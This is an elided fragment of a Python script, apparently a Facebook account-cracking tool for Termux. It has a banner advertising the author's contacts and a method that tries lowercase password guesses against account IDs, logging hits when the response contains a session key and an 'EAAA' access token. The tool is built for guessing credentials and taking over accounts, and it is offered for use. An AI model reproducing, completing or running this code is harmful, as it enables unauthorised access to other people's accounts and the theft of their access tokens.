...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰WL XIROB")
	subprocess.check_output(["am", "start", "https://m.me/100089219414185"])
...
╚═╝░░╚══╝╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : NIROB
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : Caption
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : Nirob-cyber-143
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01810736861
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [NIROB_OLD] : %s/%s -> \033[0;92m [ NIROB-OK:%s ]- \033[0;91m[NIROB-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;91m[NIROB-CP] %s|%s\033[0;97m         "%(uid, pw))
